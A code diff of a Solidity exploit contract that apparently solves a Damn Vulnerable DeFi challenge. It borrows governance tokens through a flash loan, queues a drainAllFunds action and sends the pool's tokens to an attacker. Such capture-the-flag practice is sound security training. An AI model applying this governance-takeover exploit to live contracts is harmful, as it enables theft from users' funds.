@@ -27,7 +27,11 @@ contract Hack {
      function run() public returns (uint256) {
         uint256 value = 1000001 ether;
         SelfiePool(pool).flashLoan(value);
-        return SimpleGovernance(gov).queueAction(pool, abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);
+        return SimpleGovernance(gov).queueAction(
+            pool, 
+            abi.encodeWithSignature("drainAllFunds(address)", address(this)), 
+            0
+        );
     }
 
     function receiveTokens(address _token, uint256 _amount) public {
@@ -37,7 +41,7 @@ contract Hack {
 
     function sendToAttacker() public {
         DamnValuableTokenSnapshot t = DamnValuableTokenSnapshot(token);
-        t.transfer(attacker, t.balanceOf(address(this))); // 2000000 tokens
+        t.transfer(attacker, t.balanceOf(address(this)));
     }
 }
 
@@ -52,9 +56,7 @@ contract Deployer {
     }
 
     function drain(address gov) public {
-        console.log('Executing the drain action');
         SimpleGovernance(gov).executeAction(actionId);
-        console.log('We have now drained the pool; sending the muny to the attacker');
         hackContract.sendToAttacker();
     }
 }
